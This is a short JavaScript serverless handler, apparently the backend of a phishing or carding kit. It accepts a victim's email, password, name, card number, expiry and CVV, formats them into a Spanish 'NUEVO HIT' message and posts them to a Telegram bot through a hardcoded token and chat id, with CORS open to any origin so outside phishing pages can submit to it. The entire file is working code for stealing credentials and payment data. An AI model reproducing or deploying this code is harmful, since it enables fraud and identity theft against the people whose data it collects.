import axios from 'axios';

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();

    const { em, pw, nm, cc, ex, cv, luhn } = req.body;

    const tg_token = "8255731465:AAGrPR_qH0zC4zTdBqOj-Zt1jqY0W03-yws";
    const chat_id = "7993722214";

    const msg = `🔔 **NUEVO HIT (SIN STRIPE)** 🔔\n\n` +
                `🛡️ **Luhn Check:** ${luhn}\n` +
                `📧 **Email:** \`${em}\` \n` +
                `🔑 **Pass:** \`${pw}\` \n\n` +
                `👤 **Nombre:** ${nm}\n` +
                `💳 **CC:** \`${cc}\` \n` +
                `📅 **Exp:** ${ex}\n` +
                `🔒 **CVV:** \`${cv}\``;

    try {
        await axios.post(`https://api.telegram.org/bot${tg_token}/sendMessage`, {
            chat_id: chat_id,
            text: msg,
            parse_mode: 'Markdown'
        });
        return res.status(200).json({ ok: true });
    } catch (err) {
        return res.status(200).json({ ok: false });
    }
}
